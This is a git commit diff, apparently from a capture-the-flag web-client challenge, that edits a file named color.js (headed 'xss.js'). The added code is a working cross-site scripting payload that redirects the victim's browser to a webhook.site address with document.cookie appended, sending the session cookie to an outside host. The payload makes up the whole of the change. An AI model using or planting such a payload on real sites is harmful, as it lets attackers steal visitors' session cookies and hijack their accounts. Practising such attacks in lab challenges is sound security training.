2b293c7c0d250e62fdcbfcda701e2a5492f2a756
tristanqtn <tristan.querton@gmail.com>
2025-02-02 15:38:49 +0100

    aaaa

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,6 +1,7 @@
 // xss.js
 (function () {
   alert("XSS Triggered!");
-  // Exfiltration possible
-  console.log("ici");
+  document.location =
+    "https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=" +
+    document.cookie;
 })();
